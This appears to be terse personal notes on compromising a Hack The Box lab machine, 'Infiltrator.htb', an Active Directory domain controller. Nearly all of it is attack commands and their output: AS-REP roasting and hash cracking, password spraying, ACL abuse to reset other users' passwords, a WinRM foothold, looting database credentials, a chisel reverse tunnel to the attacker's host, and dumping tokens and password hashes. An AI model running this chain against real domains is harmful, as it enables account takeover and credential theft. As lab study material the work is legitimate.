Scan : 
```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Infiltrator.htb
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-02 11:57:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2024-09-02T11:58:53+00:00; +2s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-02T11:58:53+00:00; +2s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-02T11:58:53+00:00; +2s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-02T11:58:53+00:00; +2s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-09-02T11:58:53+00:00; +2s from scanner time.
| rdp-ntlm-info:
|   Target_Name: INFILTRATOR
|   NetBIOS_Domain_Name: INFILTRATOR
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: infiltrator.htb
|   DNS_Computer_Name: dc01.infiltrator.htb
|   DNS_Tree_Name: infiltrator.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-09-02T11:58:13+00:00
| ssl-cert: Subject: commonName=dc01.infiltrator.htb
| Not valid before: 2024-07-30T13:20:17
|_Not valid after:  2025-01-29T13:20:17
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-09-02T11:58:16
|_  start_date: N/A
```

- Enum :
```sh
- David Anderson -->  d.anderson
- Olivia Martinez --> o.martinez
- Kevin Turner -->k.turner
- Amanda Walker -->a.walker
- Marcus Harris -->m.harris
- Lauren Clark -->l.clark
- Ethan Rodriguez e.rodriguez
```

- Aesproasting : 
```sh
username-anarchy -i users.txt > out.txt
kerbrute userenum --dc dc01.infiltrator.htb -d infiltrator.htb users
GetNPUsers.py infiltrator/ -usersfile users -format hashcat -dc-ip dc01.infiltrator.htb
hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt

l.clark : WAT?watismypass!
netexec smb 10.129.162.64 -u l.clark -p 'WAT?watismypass!' --rid-brute | grep '\\' | cut -d $'\\' -f2 | cut -d ' ' -f1 | tee -a users_rid.txt
```

- Enum : 
```sh
bloodhound-python -d 'infiltrator.htb' -u 'l.clark' -p 'WAT?watismypass!' -ns 127.0.0.1 -dc dc01.infiltrator.htb -c all
```
- User  Description :
```sh
netexec ldap 10.129.96.85 -u l.clark -p 'WAT?watismypass!' --user
K.turner | MessengerApp@Pass!
```

- Spraying :
```sh
netexec smb 10.129.62.59 -u users_rid.txt -p 'WAT?watismypass!' --continue-on-success

infiltrator.htb\D.anderson:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION
infiltrator.htb\L.clark:WAT?watismypass!
infiltrator.htb\M.harris:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION

netexec smb 10.129.62.59 -u users_rid.txt -p 'WAT?watismypass!' --continue-on-success -k

infiltrator.htb\D.anderson:WAT?watismypass!
infiltrator.htb\L.clark:WAT?watismypass!
```

- Modifying krb5.conf : 
```sh
[libdefaults]
    default_realm = INFILTRATOR.HTB

[realms]
    INFILTRATOR.HTB = {
        kdc = 10.10.11.31
        admin_server = 10.10.11.31
    }

[domain_realm]
    .infiltrator.htb = INFILTRATOR.HTB
    infiltrator.htb = INFILTRATOR.HTB
```
-  Reset  password : 
```sh
getTGT.py 'infiltrator.htb'/'d.anderson'@$t

dacledit.py -action write -rights FullControl -principal d.anderson -target-dn "OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB" -inheritance -k -dc-ip $t infiltrator.htb/

bloodyAD --host $t -d "infiltrator.htb" -k set password e.rodriguez "Password1234"

bloodyAD --host $t -d "infiltrator.htb" -u "e.rodriguez" -p "Password1234" add groupMember "CHIEFS MARKETING" "e.rodriguez"

bloodyAD --host $t -d "infiltrator.htb" -u "e.rodriguez" -p "Password1234" set password m.harris "Password12345"

```


 - Foothold :
 ```sh
getTGT.py 'infiltrator.htb'/'m.harris'@10.129.62.59
evil-winrm -i dc01.infiltrator.htb -r INFILTRATOR.HTB
 ```

- Creds looting :
```sh
*Evil-WinRM* PS C:\> cmd /c dir /A
 Volume in drive C has no label.
 Volume Serial Number is 96C7-B603

 Directory of C:\

02/19/2024  06:45 PM    <DIR>          $Recycle.Bin
02/19/2024  08:32 AM    <DIR>          .NET Framework 4.8
12/04/2023  07:21 PM    <JUNCTION>     Documents and Settings [C:\Users]
12/04/2023  11:14 AM    <DIR>          inetpub
09/04/2024  09:02 PM       738,197,504 pagefile.sys
11/05/2022  12:03 PM    <DIR>          PerfLogs
02/23/2024  06:06 AM    <DIR>          Program Files
02/20/2024  04:18 AM    <DIR>          Program Files (x86)
02/22/2024  01:27 PM                 0 Program1
02/25/2024  08:34 AM                 0 Program2
09/04/2024  09:05 PM    <DIR>          ProgramData
12/04/2023  07:21 PM    <DIR>          Recovery
02/20/2024  04:22 AM    <DIR>          System Volume Information
09/05/2024  12:37 AM    <DIR>          temp
08/02/2024  04:51 PM    <DIR>          Users
08/21/2024  01:53 PM    <DIR>          Windows

```

```sh
[Sep 05, 2024 - 10:19:49 (CEST)] exegol-Algo out # cat OutputMysql.ini
[SETTINGS]
SQLPort=14406
Version=1.0.0

[DBCONFIG]
DBUsername=root
DBPassword=ibWijteig5
DBName=outputwall

[PATHCONFIG]
;mysql5.6.17
MySQL=mysql
Log=log
def_conf=settings
MySQL_data=data
Backup=backup

```
- Privesc : 
```sh
./chisel.exe client 10.10.14.190:8888 R:1080:socks
./chisel server -p 8888 -reverse &
#proxychain to burp
```

- unattended :
```sh
SELECT LOAD_FILE('C:\\Users\\Administrator\\Desktop\\root.txt');
fce216c915adb6d843abe6b1defc7dce
```




- Attended :
```sh
PS C:\UserExplorer> .\UserExplorer.exe -u m.harris -p D3v310p3r_Pass@1337! -s m.harris Attempting Service Connection...
proxychains -q  mysql -h 10.10.11.31 -u root -p -P 14406

|user_name | register_date       | email               | password                                 | db_string | is_active | exp_date            | max_users | plan | license_key | 
-----------+--------------+---------------------------------------+-----------+---------------------+---------------------+------------------------------------------+-----------+-----------+---------------------+-----------+------+-------------+-----
| admin     | 2014-10-18 10:46:30 | demo@outputtime.com | 38f078a81a2b033d197497af5b77f95b50bfcfb8 |           |         1 | 2031-10-29 06:23:42 |         0 | T    | 

38f078a81a2b033d197497af5b77f95b50bfcfb8:admin12
```

- Tokens : 
```sh
MariaDB [outputwall]> select * from ot_wall_tokens;
+----------+---------+------------+---------------------------+-----------+-----------+-------------------------------------------------------------------------------+---------------------+
| token_id | user_id | first_name | email                     | user_role | entity_id | auth_token                                                                    | expiry_date         |
+----------+---------+------------+---------------------------+-----------+-----------+-------------------------------------------------------------------------------+---------------------+
|        1 |       7 | K.turner   | turner@infiltrator.htb    | U         |         1 | iX9Z\/yslevNIY0R6aKNzBebgT_KpW4BlaGHjWS1zpd5QcmaRx8UGwBvaMxy3Q3Wb2E5XhI9lpIo= | 2024-02-22 00:00:00 |
|        7 |       9 | winrm_svc  | winrm_svc@infiltrator.htb | U         |         1 | iX9Z\/yslevMmHLWW_pvaVChN6kbwB_cbGHvAA75yee65xBQMd20Dgmf2iXD18Oq9hiwcgIfB1uo= | 2024-02-26 00:00:00 |
|       16 |       1 | Admin      |                           | A         |         1 | iX9Z\/yslevMJZgSfyKCEdHJE3RjYRSAMORYGfFRYTag9N3WBn20KJrgPbziU39gX             | 2024-09-06 00:00:00 |
+----------+---------+------------+---------------------------+-----------+-----------+-------------------------------------------------------------------------------+---------------------+
```

